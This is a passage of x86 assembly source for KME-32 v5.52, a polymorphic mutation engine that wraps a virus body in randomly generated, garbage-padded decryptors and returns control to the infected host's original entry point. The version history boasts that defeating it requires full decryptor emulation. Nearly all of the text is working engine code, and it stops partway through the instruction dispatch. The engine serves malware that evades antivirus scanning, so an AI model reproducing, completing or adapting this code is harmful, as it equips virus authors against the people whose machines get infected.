
; ---------------------------------------------------------------------------
;              KME-32 v5.52 -- Kewl Mutation Engine -- SOURCE
; ---------------------------------------------------------------------------
;
;     KME  is  easy  to  use,  highly  configurable, and compatible with any
; x86-based  platform  (Win9X/WinNT, ring0/ring3) 32-bit  polymorphic engine
; with stack algorithm, in some cases allowing data compression.
;     By-passing KME encryption layers requires full decryptor emulation, in
; some cases including FPU.
;
; ---------------------------------------------------------------------------
;
;                               VERSION HISTORY
;
; release 1.00 -- November'1999
;                  + permutable code (no data at all & etc)
; release 2.00 -- August'00
;                  + movsx/zx
;                  + cmp r, r/c ; poly_cmd() ; jz/nz follow/nofollow
;                  + push r/c ; poly_cmd() ; pop r
;                  + subroutine
;                  + call subroutine
; release 3.00 -- November'00 -- repaired back ;-)
;                  + BSR/BSF, MUL/IMUL/DIV/IDIV
;                  + AND/OR in genvalue
;                  + short-consts (such as 'sub reg, nn'), see FLAG_NOSHORT_C
;                  + other-opcodes ('cmd reg,reg' with inverted S-bit), see FLAG_NOSWAP
;                  + jz/nz --> jxx/nxx
;                  + subroutines/calls fixed, epilog-code fixed,
;                  + cycles
;                  + randomer fixed
;                  + now you can specify register values passed from engine
;                    into virus. 'exitregptr' parameter points to 8 dwords,
;                    eax/ecx/edx/ebx/esp/ebp/esi/edi.
;                    values, equal to -1, are unused.
;                    Also, only these registers are processed,
;                    which are specified in regavail bitset.
;                  + also, you can specify engine's initial register values.
;                    'initregptr' parameter points to 8 dwords,
;                    same as with exitregptr parameter.
;                  + fsin/fcos
; release 3.50 -- January'2001
;                  + cdecl-calling convention, + user-param
;                  + randseed replaced with external randomer
;                  + now returns result in EAX (0=OK,!0=error)
; release 4.00 -- January/February'2001 -- special edition for PGN2 project
;                  + interface/parameters changes, bugfixes, - user-param
;                  + exitcode inversed to: 1 if all OK, 0 if error
;                  + OriginalEntryPointRVA, + VirusRVA
;                  + FLAG_X_CALLESP     call esp, add esp, <N>  ||  jmp esp
;                    + FLAG_X_RETBYJMP  JMP OriginalEntryPoint  ||  RET
;                  + regsave mask (push/pop regs at prolog/epilog)
;                  + XOR/SUB R,R in initial genvalue
;                  + fsqrt,fadd,fsub,fsubr,fmul,fdiv,fdivr
;                  + randomly select from fild/fld & fistp/fstp
; release 4.10 -- Feb'2001
;                  + RETN --> MOV EAX,1/RET 0Ch (used when EntryPoint==0)
; release 4.50 -- Oct'2001
;                  + return of the internal randomer (now specify randseed)
;                  + once again bugfixed
; release 5.00 -- Dec'2001
;                  + repeated PUSHs for same values, w/o new value generation
;                  + complex cycles with multiple regs changes in CMD2_CYCLE
; release 5.50 -- Dec'2001
;                  + randomer bugfixed & improved - 2nd randomer added, now
;                    sumary randseed depends also on crc of given code, so
;                    you can pass 0 as randseed into engine, and anyway, if
;                    input code is variable, generated code will be random
;                  + built-in MULTILAYER support, now you shouldn't
;                    call KME several times to create multilayer decryptors
;                  + bugfix: garbage was disabled in most cases
;                  + CMD2_CYCLE fixed
;                  + exit codes (KME_ERROR_xxx)
;                  + FLAG_FAILIFNOMEMORY & FLAG_X_NORET
; release 5.51 -- Dec'2001
;                  + some minor, but useful changes
;                  + interleave removed, bad idea
;                  + KME.TXT
;                  + tempbuf & outbuf on exit/error CC-fill
; release 5.52 -- Dec'2001
;                  + po_size & po_entry now can be NULL even if multilayer
;                  + now fill padding with o_fillchar instead of CC
;                  + bugfix: now correct last-layer handling
;
; ---------------------------------------------------------------------------

C_EIP_MAX_ITER          equ     10000           ; these parameters used to
C_EIP_TOP               equ     64              ; find new JMP location
C_EIP_BOTTOM            equ     64
C_EIP_PREV              equ     20
C_EIP_NEXT              equ     40

C_MAX_SUB               equ     32              ; max # of subroutines

testcmd                 macro   fl, lbl
                        test    cmdavail, fl
                        jz      lbl
                        endm

testcmd2                macro   fl, lbl
                        test    cmdavail2, fl
                        jz      lbl
                        endm

flagsz                  macro   fl, lbl
                        test    flags, fl
                        jz      lbl
                        endm

flagsnz                 macro   fl, lbl
                        test    flags, fl
                        jnz     lbl
                        endm

; ---------------------------------------------------------------------------

kme_main                proc    c

                        ; parameters -- pushed in reversed order

                        arg     tempbufptr:DWORD; NULL or ptr, size == o_max
                        arg     nlayer:DWORD    ; # of layers to build
                        arg     randseed:DWORD  ; push GetTickCount() here
                        arg     regsave:DWORD ; push/pop regs at prolog/epilog
                        arg     original_rva:DWORD ; original entry RVA
                        arg     vir_rva:DWORD      ; virus in-file RVA
                        arg     exitregptr:DWORD ; 0 or pointer to 8 dwords
                        arg     initregptr:DWORD ; 0 or pointer to 8 dwords
                        arg     i_offs:DWORD    ; virus offset
                        arg     i_size:DWORD    ; virus size
                        arg     i_entry:DWORD   ; virus entry (relative)
                        arg     o_offs:DWORD    ; output offset
                        arg     o_max:DWORD     ; output max buf size
                        arg     o_fillchar:DWORD; character to fill out buf
                        arg     po_size:DWORD   ; 0 or pointer to out buf size
                        arg     po_entry:DWORD  ; 0 or pointer to out entry (rel.)
                        arg     jmp_prob:DWORD  ; JMPs if rnd(jmp_prob)==0
                        arg     regavail:DWORD  ; register set (REG_XXX)
                        arg     cmdavail2:DWORD ; adv. command set (CMD2_XXX)
                        arg     cmdavail:DWORD  ; command set (CMD_XXX)
                        arg     flags:DWORD     ; flags (FLAG_XXX)

                        ; local variables
                        local   save_esp:DWORD
                        local   save_ebp:DWORD

                        ;; "state" (size is DWORD-aligned)
                        ;; state should be preserved when genereating subs
                        local   state_end:DWORD
                        local   regused:DWORD   ; set of used registers
                        local   reginit:DWORD   ; set of initialized registers
                        local   em_reg:DWORD:8  ; register values (emulation)
                        local   regbuf:BYTE:8   ; indexes of regs to be pushed
                        local   state_begin:DWORD
                        ;;

                        local   in_subroutine:BYTE   ; inside-of-subroutine
                        local   tempo:DWORD     ; use in ifollow/rfollow only
                        local   p_count:DWORD   ; # of generated subs
                        local   p_addr:DWORD:C_MAX_SUB
                        local   p_stack:BYTE:C_MAX_SUB
                        local   p_conv:BYTE:C_MAX_SUB

                        local   jxxcond:BYTE:16 ; flags, in perverted form
                        local   fpuinit:BYTE
                        local   fpustack:BYTE
                        local   n_pushed:DWORD  ; size of pushed stuff

                        local   randseed2:DWORD ; for 2nd randomer
                        local   po_size_ml:DWORD
;                       local   debug_counter:DWORD
                        local   restartcount:DWORD
                        local   t_entry:DWORD
                        local   t_size:DWORD

                        pusha
                        cld

                        mov     save_esp, esp   ; to jmp to @@error from subs
                        mov     save_ebp, ebp

                        cmp     nlayer, 1
                        jne     @@multilayer

                        flagsz  FLAG_RANDOMSTRATEGY, @@skiprnds
                        call    rnd_dword
                        mov     regavail, eax
                        call    rnd_dword
                        mov     cmdavail, eax
                        call    rnd_dword
                        mov     cmdavail2, eax
@@skiprnds:

; check jmp_prob
                        cmp     jmp_prob, 0
                        jne     @@jp
                        mov     eax, 20-10+1    ; 10..20
                        call    rnd_eax
                        add     eax, 10
                        mov     jmp_prob, eax
@@jp:
; check o_fillchar
                        cmp     o_fillchar, -1
                        jne     @@ofc
                        call    rnd_byte
                        mov     o_fillchar, eax
@@ofc:

; fix regavail -- check if no registers given
                        and     regavail, REG_ALL       ; clear ESP if set
                        jnz     @@regok
                        or      regavail, REG_DEFAULT
@@regok:
                        and     regsave, REG_ALL

                        flagsz  FLAG_ONLY386, @@skip1
                        and     cmdavail, not (CMD_BSWAP+CMD_XADD)
@@skip1:
                        mov     edi, o_offs     ; fill output buffer
                        mov     ecx, o_max
                        mov     eax, o_fillchar
                        rep     stosb

                        mov     in_subroutine, cl
                        mov     p_count, ecx
                        mov     fpuinit, cl
                        mov     fpustack, cl
                        mov     n_pushed, ecx
;                       mov     debug_counter, ecx

                        ; initialize bitsets: registers initialized/used
                        mov     reginit, ecx
                        mov     regused, ecx

                        ; init 2nd randomer
                        mov     esi, i_offs
                        mov     ecx, i_size
                        xor     edx, edx
@@xorcycle:             lodsb
                        xor     dl, al
                        add     dl, al
                        rol     edx, 1
                        loop    @@xorcycle
                        mov     randseed2, edx

                        ; while generation, EDI contains current outpointer
                        mov     edi, o_offs

                        ; if need jmps & (not FLAG_EIP0) select random EDI
                        flagsnz FLAG_EIP0+FLAG_NOJMPS, @@skipnew
                        cmp     po_entry, 0
                        je      @@skipnew
                        call    @@find_new_eip
@@skipnew:

                        ; calculate decryptor entry point
                        mov     ecx, po_entry
                        jecxz   @@skip_retentry
                        mov     eax, edi
                        sub     eax, o_offs
                        mov     [ecx], eax
@@skip_retentry:
                        add     i_size, 3          ; i_size: align 4
                        and     i_size, not 3

                        call    @@int3          ; add INT3 if FLAG_DEBUG

                        ; set initial register values

                        cmp     initregptr, 0
                        je      @@ir_done

                        xor     ebx, ebx
@@ir_cycle:             bt      regavail, ebx
                        jnc     @@ir_cont
                        mov     edx, initregptr
                        mov     edx, [edx+ebx*4]
                        cmp     edx, -1
                        je      @@ir_cont
                        mov     em_reg[ebx*4], edx
                        bts     reginit, ebx
@@ir_cont:              inc     ebx
                        cmp     bl, 8
                        jb      @@ir_cycle
@@ir_done:
                        ; push regsave[]

                        push    regavail
                        mov     ebx, regsave
                        not     ebx
                        and     regavail, ebx
                        not     ebx
                        or      regused, ebx
@@1_push_loop:          bsf     eax, ebx
                        jz      @@1_push_done
                        btr     ebx, eax
                        bt      dword ptr [esp], eax
                        jnc     @@1x
                        bts     regavail, eax
@@1x:                   btr     regused, eax
                        call    @@eip
                        add     al, 50h
                        stosb
                        call    @@garbage_10
                        jmp     @@1_push_loop
@@1_push_done:          pop     regavail
                        ;;

                        ; ECX contains number of elements in regbuf
                        xor     ecx, ecx

                        call    @@garbage_10 ; add "logic" command

;;

@@main_cycle:           ; main encryption cycle

;                        push    ecx
;                        inc     debug_counter
;                        and     debug_counter, 63
;                        jnz     @@nodbg
;                        xor     ecx, ecx
;@@dbgccl:               bt      reginit, ecx
;                        jnc     @@nodbgchk
;                        mov     ax, 0F881h      ; cmp r32,xxxxxxxx
;                        or      ah, cl
;                        stosw
;                        mov     eax, em_reg[ecx*4]
;                        stosd
;                        mov     ax, 0FE75h      ; jne $
;                        stosw
;                        call    @@eip
;@@nodbgchk:             inc     ecx
;                        and     ecx, 7
;                        jnz     @@dbgccl
;@@nodbg:                pop     ecx

                        call    @@poly_cmd      ; add "logic" command

                        ; get next dword (backward)
                        sub     i_size, 4
                        mov     edx, i_size
                        add     edx, i_offs     ; get dword into EDX
                        mov     edx, [edx]

                        flagsnz FLAG_NOREPEATPUSH, @@skip666
                        xor     ebx, ebx
@@search_value:         cmp     em_reg[ebx*4], edx ; a register already have the value we
                        jnz     @@no_equal         ;need?
                        bt      reginit, ebx       ;...and is initialized?
                        jc      @@put_in_pushqueue ;yeah! so, put in push queue
@@no_equal:             inc     ebx
                        cmp     bl, 8
                        jnz     @@search_value
@@skip666:

                        call    @@get_init_reg  ; select/initialize rnd reg
                        jc      @@error_assert
                        xchg    ebx, eax

                        ; push registers until register in EBX become free
                        call    @@push_uptoebx

                        call    @@gen_value  ; make em_reg[EBX] equal to EDX
@@put_in_pushqueue:
                        bts     regused, ebx    ; mark reg in EBX as used
                        mov     regbuf[ecx], bl ; store EBX as ready to push
                        inc     ecx

                        flagsnz FLAG_NOREPEATPUSH, @@no_flush
                        cmp     ecx, 8
                        ja      @@error_assert
                        jb      @@no_flush
                        call    @@push_1        ; prevent queue from overflow
@@no_flush:
                        cmp     i_size, 0       ; until we still have dwords
                        jg      @@main_cycle    ; in inputstream

;;

                        call    @@push_all      ; push all unpushed registers

                        call    @@epilog        ; "epilog" code -- JMP/CALL ESP

                        ; calculate size of generated decryptor
                        sub     edi, o_offs
                        flagsnz FLAG_NOJMPS, @@nj
                        mov     edi, o_max
@@nj:
                        mov     ecx, po_size
                        jecxz   @@skip_osize
                        mov     [ecx], edi
@@skip_osize:

@@success_exit:
                        mov     eax, 1          ; EAX=1 - all ok

@@eax_exit:             mov     [esp+7*4], eax

                        dec     eax             ; success?
                        jz      @@skipccfill1
                        ; fill output buffer on error
                        mov     edi, o_offs
                        mov     ecx, o_max
                        mov     eax, o_fillchar
                        cld
                        rep     stosb
@@skipccfill1:
                        ; fill tempbuf on exit
                        mov     edi, tempbufptr
                        or      edi, edi
                        jz      @@skipccfill2
                        mov     ecx, o_max
                        mov     eax, o_fillchar
                        cld
                        rep     stosb
@@skipccfill2:
                        popa                    ; retore regs & exit
                        ret

@@error_assert:         mov     eax, KME_ERROR_ASSERT
                        jmp     @@error_eax
@@error_nomemory:       mov     eax, KME_ERROR_NOMEMORY
                        jmp     @@error_eax
@@error_badarg:         mov     eax, KME_ERROR_BADARG
;                       jmp     @@error_eax

@@error_eax:            mov     esp, save_esp   ; rest. ESP (if call from sub)
                        mov     ebp, save_ebp
                        jmp     @@eax_exit

; ===================== subroutines =========================================

; add INT3 command (if FLAG_DEBUG)
@@int3:                 flagsz  FLAG_DEBUG, @@skip_debug
;@@int3_do:
                        push    eax
                        mov     al, 0CCh
                        stosb
                        pop     eax
@@skip_debug:           retn

; ---------------------------------------------------------------------------

                        ; push 1 register
                        ; (indexes stored in regbuf, count in ECX)

@@push_1:               jecxz   @@nothing2push

                        add     n_pushed, 4
                        dec     ecx             ; decr. num of regs in regbuf
                        movzx   eax, regbuf     ; read 1 byte
                        pusha                   ; delete 1st entry in regbuf
                        lea     esi, regbuf+1
                        lea     edi, regbuf
                        movsd                   ; just 8 bytes
                        movsd
                        popa

                        flagsnz FLAG_NOREPEATPUSH, @@free_it
                        jecxz   @@free_it
                        pushad
                        lea     edi, regbuf     ;scan push queue for the register we just pushed...
                        repne   scasb        ;it appear once again? so dont free
                        popad
                        je      @@dont_free_yet
@@free_it:
                        btr     regused, eax    ; mark register as free
@@dont_free_yet:
                        call    @@eip           ; add JMP
                        push    eax
                        add     al, 50h         ; PUSH reg
                        stosb
                        pop     eax

                        push    regused
                        bts     regused, eax
                        call    @@poly_cmd      ; "logic" command
                        pop     regused

@@nothing2push:
                        retn

                        ; push all registers
                        ; (indexes stored in regbuf, count in ECX)

@@push_all:             jecxz   @@push_all_done
                        call    @@push_1
                        jmp     @@push_all
@@push_all_done:        retn

                        ; push registers up to pointed by EBX
                        ; (indexes stored in regbuf, count in ECX)

@@push_uptoebx:         bt      regused, ebx
                        jnc     @@ebx_free
                        call    @@push_1
                        jmp     @@push_uptoebx
@@ebx_free:             retn

; ===========================================================================

                        ; "epilog" code --
                        ; -- load regs and CALL ESP in perverted form

@@epilog:               call    @@garbage_10    ; "logic"

                        cmp     regused, 0
                        jne     @@error_assert

                        flagsz  FLAG_X_NORET, @@continue_epilog
                        call    @@epilog_regs
                        jmp     @@ret_from_epilog
@@continue_epilog:
                        call    @@get_free_reg  ; get free rnd reg <reg1>
                        jc      @@error_assert
                        xchg    ecx, eax
                        btr     regavail, ecx  ; to avoid usage in logic;
                        btr     reginit, ecx    ; value unknown (ESP)

                        call    @@eip           ; JMP

                        mov     ax, 0E089h      ; mov reg1, esp
                        add     ah, cl
                        stosw

                        call    @@garbage_10

                        call    @@get_free_reg  ; get free rnd <reg2>
                        jnc     @@morethan1reg

; if we have only 1 register

@@1reg:
                        cmp     i_entry, 0
                        je      @@skipadd1
                        call    @@eip           ; JMP
                        mov     ax, 0C081h      ; add reg1, i_entry
                        add     ah, cl
                        stosw
                        mov     eax, i_entry
                        stosd
@@skipadd1:
                        ; cant emul - ESP unknown

                        jmp     @@1ornot

; if we have more than 1 register

@@morethan1reg:         xchg    ebx, eax
                        bts     regused, ebx    ; mark as used

                        mov     edx, i_entry    ; reg2 <-- i_entry
                        call    @@gen_value

                        call    @@garbage_10

                        call    rnd_zf
                        jz      @@skip_xchg
                        ; lets do vise versa: add reg2, reg1
                        bts     regavail, ecx   ; free reg1
                        btr     regavail, ebx
                        btr     reginit, ebx    ; value becomes unknown
                        xchg    ecx, ebx        ; invert register usage
@@skip_xchg:
                        btr     regused, ebx

                        call    @@eip           ; JMP
                        mov     ax, 0C001h      ; add reg1, reg2
                        or      ah, cl
                        shl     bl, 3
                        or      ah, bl
                        stosw

                        ; cant emul - ESP unknown
@@1ornot:
                        call    @@garbage_10

                        ;; does reg1 value should be passed into virus?
                        mov     eax, exitregptr
                        or      eax, eax
                        jz      @@skipchk
                        cmp     dword ptr [eax+ecx*4], -1
                        je      @@skipchk
                        flagsnz FLAG_X_CALLESP, @@push_ret
@@skipchk:              ;;

                        flagsnz FLAG_X_CALLESP, @@calljmp

                        call    rnd_zf
                        jz      @@calljmp

@@push_ret:             lea     eax, [ecx+50h]      ;push reg1
                        stosb

                        bts     regavail, ecx
                        btr     regused, ecx    ; free reg1

                        call    @@garbage_10

                        call    @@epilog_regs

                        call    @@eip

                        flagsnz FLAG_X_CALLESP, @@callddesp

                        mov     al, 0c3h        ; ret
                        stosb

                        jmp     @@lwo

@@callddesp:            mov     ax, 14FFh       ; call dword ptr [esp]
                        stosw
                        mov     al, 24h
                        stosb

                        add     n_pushed, 4

                        jmp     @@lwo

@@calljmp:              call    @@epilog_regs
                        call    @@eip

                        mov     ax, 0E0FFh      ; JMP <reg1>
                        flagsz  FLAG_X_CALLESP, @@itsjmp
                        mov     ah, 0D0h        ; CALL <reg1>
@@itsjmp:
                        add     ah, cl
                        stosw

                        bts     regavail, ecx
                        btr     regused, ecx    ; free reg1
@@lwo:
                        mov     reginit, 0    ; all values become unknown
                        mov     regused, 0    ; and free

                        call    @@garbage_10

                        flagsz  FLAG_X_CALLESP, @@ret_from_epilog ; was JMP ?

                        call    @@eip
                        mov     ax, 0C481h  ; add esp, xxxx
                        stosw
                        mov     eax, n_pushed
                        stosd

                        call    @@garbage_10

                        ;;
                        mov     ebx, regsave
@@1_pop_loop:           bsr     eax, ebx
                        jz      @@1_pop_done
                        btr     ebx, eax
                        call    @@eip
                        btr     regavail, eax
                        btr     reginit, eax
                        add     al, 58h       ; pop
                        stosb
                        call    @@poly_cmd
                        jmp     @@1_pop_loop
@@1_pop_done:           ;;

@@skip_popregs:
                        call    @@eip

                        flagsnz FLAG_X_RETBYJMP, @@rbj

                        flagsnz FLAG_X_RET0C, @@r0C

                        call    @@eip
                        mov     al, 0C3h        ; retn
                        stosb

                        jmp     @@ret_from_epilog
@@rbj:
                        mov     al, 0E9h
                        stosb
                        lea     eax, [edi+4]
                        sub     eax, o_offs
                        add     eax, vir_rva
                        sub     eax, original_rva
                        neg     eax
                        stosd
@@ret_from_epilog:
                        call    @@garbage_10

                        retn    ; @@epilog

@@r0C:                  mov     regavail, REG_EAX
                        mov     reginit, 0
                        mov     regused, 0
                        call    @@poly_cmd
                        xor     eax, eax
                        call    @@reg_init_eax
                        xor     ebx, ebx        ; eax
                        mov     edx, 1          ; 1
                        call    @@gen_value
                        bts     regused, eax    ; v5.50 bugfix
                        call    @@poly_cmd

                        call    @@eip
                        mov     al, 0C2h        ; ret 0Ch
                        stosb
                        mov     ax, 000Ch
                        stosw

                        jmp     @@ret_from_epilog

@@epilog_regs:          cmp     exitregptr, 0
                        je      @@er_ret

                        xor     ebx, ebx

@@er_cycle:             bt      regavail, ebx
                        jnc     @@er_cont

                        mov     edx, exitregptr
                        mov     edx, [edx+ebx*4]
                        cmp     edx, -1
                        je      @@er_cont

                        call    @@gen_value     ; em_reg[ebx*4] <-- edx
                        bts     regused, ebx

                        call    @@poly_cmd

@@er_cont:              inc     ebx
                        cmp     bl, 8
                        jb      @@er_cycle

@@er_ret:               call    @@int3

                        retn

@@garbage_10:           mov     eax, 10

@@multi_garbage:        call    rnd_eax
                        jz      @@mg_ret
@@gen_garbage:          call    @@poly_cmd
                        dec     eax
                        jnz     @@gen_garbage
@@mg_ret:               retn

; ===========================================================================

                        ; this subroutine makes em_reg[EBX] equal to EDX

@@gen_value:
                        ; use XOR if noone specified
                        testcmd CMD_XOR+CMD_ADD+CMD_SUB+CMD_AND+CMD_OR, @@rdef

@@gen_value_restart:    mov     eax, 5          ; EAX=#
                        call    rnd_eax

                        jz      @@r0            ; sub           dispatch
                        dec     eax
                        jz      @@r1            ; add

                        dec     eax             ; and
                        jz      @@r3
                        dec     eax             ; or
                        jz      @@r4

                        ; xor
@@r2:                   testcmd CMD_XOR, @@gen_value_restart
@@rdef:                 xor     edx, em_reg[ebx*4]      ; emul -- xor reg, c
                        xor     em_reg[ebx*4], edx
                        mov     eax, 35F081h            ; opcodes
                        jmp     @@store_cmd

@@r1:                   testcmd CMD_ADD, @@gen_value_restart
                        sub     edx, em_reg[ebx*4]      ; emul -- add reg, c
                        add     em_reg[ebx*4], edx
                        mov     eax, 05C081h            ; opcodes
                        jmp     @@store_cmd

@@r0:                   testcmd CMD_SUB, @@gen_value_restart
                        sub     edx, em_reg[ebx*4]      ; emul -- sub reg, c
                        neg     edx
                        sub     em_reg[ebx*4], edx
                        mov     eax, 2dE881h            ; opcodes

@@store_cmd:            or      edx, edx        ; skip zero-argument
                        jz      @@rt
@@store_cmd_even0:
                        call    @@eip           ; JMP

                        flagsnz FLAG_NOSHORT, @@long   ; if skip short opcs

                        or      ebx, ebx        ; use short form for EAX
                        jnz     @@long
                        shr     eax, 16

@@short:                stosb                   ; store 1-byte opcode
                        jmp     @@shortorlong

@@long:                 add     ah, bl          ; store 2-byte opcode
                        stosw

@@shortorlong:          xchg    edx, eax        ; store argument (EDX)
                        stosd

@@rt:                   retn

@@r3:                   testcmd CMD_AND, @@gen_value_restart

                        ; em_reg and ? = edx
                        ; 0          *    0
                        ; 0          -    1
                        ; 1          0    0
                        ; 1          1    1

                        mov     eax, em_reg[ebx*4]      ; em_reg and ? = edx
                        and     eax, edx                ; 0         none 1
                        cmp     eax, edx
                        jne     @@rdef  ; gen_value_restart

                        call    rnd_dword               ; em_reg and ? = edx
                        not     em_reg[ebx*4]           ; 0         any  0
                        and     eax, em_reg[ebx*4]
                        not     em_reg[ebx*4]
                                                        ; em_reg and ? = edx
                        xor     edx, eax                ; 1         copy 0/1

                        and     em_reg[ebx*4], edx

                        mov     eax, 25E081h
                        jmp     @@store_cmd_even0

@@r4:                   testcmd CMD_OR, @@gen_value_restart

                        ; em_reg or ? = edx
                        ; 0         0    0
                        ; 0         1    1
                        ; 1         -    0
                        ; 1         *    1

                        mov     eax, edx                ; em_reg or ? = edx
                        and     eax, em_reg[ebx*4]      ; 1        none 0
                        cmp     eax, em_reg[ebx*4]
                        jne     @@rdef  ; gen_value_restart

                        call    rnd_dword               ; em_reg or ? = edx
                        and     eax, em_reg[ebx*4]      ; 1         *   1

                        xor     edx, eax

                        or      em_reg[ebx*4], edx

                        mov     eax, 0DC881h
                        jmp     @@store_cmd

; ===================== register selection management =======================

                        ; get random register
@@get_rnd_reg:          cmp     regavail, 0
                        je      @@get_rnd_reg_err
                        call    rnd_8
                        bt      regavail, eax   ; "regavail" set only
                        jnc     @@get_rnd_reg
                        clc
                        retn
@@get_rnd_reg_err:      mov     eax, -1
                        stc
                        retn

; ---------------------------------------------------------------------------

                        ; get random initialized register
@@get_init_reg:         call    @@get_rnd_reg   ; get random reg
                        jc      @@get_init_reg_err
                        call    @@reg_init_eax  ; initialize it (if not yet)
                        clc     ; v5.50 bugfix
@@get_init_reg_err:     retn

; ---------------------------------------------------------------------------

                        ; check register & initialize it if uninitialized yet
                        ; used 'coz initially em_reg[0..7] is unknown

@@reg_init_eax:         bts     reginit, eax    ; initialized?
                        jc      @@reg_init_retn

                        push    ebx
                        mov     ebx, eax

                        call    @@eip           ; JMP

                        call    rnd_3
                        jz      @@init_pushpop
                        dec     eax
                        jz      @@init_xorsub

@@init_mov:             mov     al, 0B8h        ; MOV r, c
                        or      al, bl
                        stosb
                        call    rnd_dword
                        mov     em_reg[ebx*4], eax  ; store initial em_reg[]
                        stosd

@@init_done:            xchg    ebx, eax
                        pop     ebx

@@reg_init_retn:        retn

@@init_pushpop:         testcmd CMD_PUSHPOP, @@init_mov

                        mov     al, 68h
                        stosb
                        call    rnd_dword
                        mov     em_reg[ebx*4], eax  ; store initial em_reg[]
                        stosd

                        call    @@eip
                        lea     eax, [ebx+58h]
                        stosb

                        jmp     @@init_done

@@init_xorsub:          testcmd CMD_XOR, @@_sub
                        mov     al, 31h         ; xor
                        call    rnd_zf
                        jz      @@_xor
@@_sub:                 testcmd CMD_SUB, @@init_mov
                        mov     al, 29h         ; sub
@@_xor:                 flagsnz FLAG_NOSWAP, @@_v0
                        call    rnd_zf
                        jz      @@_v0
                        xor     al, 2
@@_v0:                  stosb
                        mov     al, bl
                        shl     al, 3
                        or      al, bl
                        or      al, 0C0h
                        stosb

                        mov     em_reg[ebx*4], 0

                        call    @@do_incdec
                        call    @@do_incdec

                        jmp     @@init_done

@@do_incdec:            call    rnd_zf
                        jz      @@_v3

                        call    @@eip

                        call    rnd_zf
                        jz      @@_v2

@@_v1:                  testcmd CMD_INC, @@_v3
                        inc     em_reg[ebx*4]
                        mov     al, 40h         ; inc
                        or      al, bl
                        stosb
                        jmp     @@_v3

@@_v2:                  testcmd CMD_DEC, @@_v3
                        dec     em_reg[ebx*4]
                        mov     al, 48h         ; dec
                        or      al, bl
                        stosb

@@_v3:                  retn

; ---------------------------------------------------------------------------

                        ; get random initialized register marked as "free"
@@get_free_reg:         mov     eax, regused     ; 2+4
                        and     eax, regavail
                        cmp     eax, regavail    ; 2
                        je      @@bad
                        call    @@get_init_reg
                        jc      @@bad
                        bt      regused, eax
                        jc      @@get_free_reg
;                       clc
                        retn
@@bad:                  mov     eax, -1
                        stc
                        retn

; ===========================================================================

                        ; this subroutine finds new output pointer (in EDI)

@@find_new_eip:
                        mov     edx, C_EIP_MAX_ITER ; max number of restarts

@@eip_find:             dec     edx             ; error if no free space
                        jz      @@error_nomemory

                        ; find random location within outbuf
                        mov     eax, o_max
                        sub     eax, C_EIP_TOP+C_EIP_BOTTOM
                        call    rnd_eax
                        add     eax, C_EIP_TOP
                        add     eax, o_offs
                        xchg    edi, eax

                        ; scan it -- should be unused
                        mov     ecx, C_EIP_NEXT+C_EIP_PREV
                        mov     eax, o_fillchar
                        repz    scasb
                        jnz     @@eip_find
                        sub     edi, C_EIP_NEXT

                        retn

; ---------------------------------------------------------------------------

                        ; this subroutine called before each command is
                        ; stored to output stream
                        ; it probably adds JMP to new random location

@@eip_do1:              pushad
                        jmp     @@eip_do

@@eip:                  pusha

                        mov     eax, o_offs     ; check if end of outbuf is
                        add     eax, o_max      ; reached. MUST add jmp then.
                        sub     eax, edi
                        cmp     eax, C_EIP_BOTTOM
                        jb      @@eip_do

                        mov     eax, o_fillchar ; scan following code --
                        mov     ecx, C_EIP_NEXT ; -- it should be unused,
                        push    edi             ; MUST add jmp otherwise
                        repz    scasb
                        pop     edi
                        jnz     @@eip_do

                        ; here we may skip jmp

                        flagsnz FLAG_NOJMPS, @@eip_done ; JMPs disabled? -exit

                        mov     eax, jmp_prob   ; add JMP if rnd(jmp_prob)==0
                        call    rnd_eax
                        jnz     @@eip_done

@@eip_do:
                        ; well, here we MUST select new location, or die

                        flagsnz FLAG_NOJMPS, @@error_nomemory ; no JMPs? - error!

                        mov     al, 0E9h        ; add JMP
                        stosb
                        stosd                   ; space for argument
                        mov     ebx, edi        ; save old position

                        call    @@find_new_eip  ; try to find new location

                        mov     eax, edi        ; link
                        sub     eax, ebx
                        mov     [ebx-4], eax

@@eip_done:             mov     [esp+0*4], edi  ; pushad_edi
                        popa
                        retn

; ===================== "logic" management ==================================

                        ; this subroutine adds "logic" instruction into
                        ; output stream.

@@poly_cmd:             pusha

                        flagsnz FLAG_NOLOGIC, @@poly_cmd_exit ; logic disabled? --exit

                        mov     eax, cmdavail           ; no avail cmds?
                        or      eax, cmdavail2
                        jz      @@poly_cmd_exit         ; --exit

                        mov     eax, regused            ; all avail regs used?
                        cmp     eax, regavail
                        je      @@poly_cmd_exit         ; --exit

                        call    @@eip                   ; add JMP if needed

@@poly_cmd_restart:

REG1                    equ     ebx
REG2                    equ     edx
REG1_8                  equ     bl
REG2_8                  equ     dl
XXX                     equ     ecx                     ; fixed
XXX_8                   equ     cl                      ; fixed

                        ; reg1: destination, read-write
                        call    @@get_free_reg          ; get free reg <reg1>
                        xchg    REG1, eax
                        jc      @@poly_cmd_exit

                        ; reg2: source, read-only. to write into, do check
                        call    @@get_init_reg          ; get init reg <reg2>
                        xchg    REG2, eax
                        jc      @@poly_cmd_exit

                        call    rnd_dword               ; get random argument
                        xchg    XXX, eax

                        mov     eax, 55
                        call    rnd_eax         ; select random command index

                        ; dispatch

                        or      eax, eax
                        jz      @@x_not
                        dec     eax
                        jz      @@x_neg
                        dec     eax
                        jz      @@x_inc
                        dec     eax
                        jz      @@x_dec
                        dec     eax
                        jz      @@x_inc
                        dec     eax
                        jz      @@x_dec
                        dec     eax
                        jz      @@x_shl
                        dec     eax
                        jz      @@x_shr
                        dec     eax
                        jz      @@x_rol
                        dec     eax
                        jz      @@x_ror
                        dec     eax
                        jz      @@x_sar
                        dec     eax
                        jz      @@x_mov_c
                        dec     eax
                        jz      @@x_add_c
                        dec     eax
                        jz      @@x_sub_c
                        dec     eax
                        jz      @@x_mov_c
                        dec     eax
                        jz      @@x_add_c
                        dec     eax
                        jz      @@x_sub_c
                        dec     eax
                        jz      @@x_xor_c
                        dec     eax
                        jz      @@x_and_c
                        dec     eax
                        jz      @@x_or_c
                        dec     eax
                        jz      @@x_rol_c
                        dec     eax
                        jz      @@x_ror_c

                        dec     eax             ; r1, r1
                        jz      @@x_add
                        dec     eax             ;
                        jz      @@x_sub
                        dec     eax             ;
                        jz      @@x_xor

                        dec     eax             ; r1, r2
                        jz      @@x_imul_ex
                        dec     eax             ; r1, r2, c
                        jz      @@x_imul_ex_c

                        dec     eax             ; r1, c
                        jz      @@x_btc_c
                        dec     eax             ;
                        jz      @@x_btr_c
                        dec     eax             ;
                        jz      @@x_bts_c

                        dec     eax             ; r1
                        jz      @@x_bswap

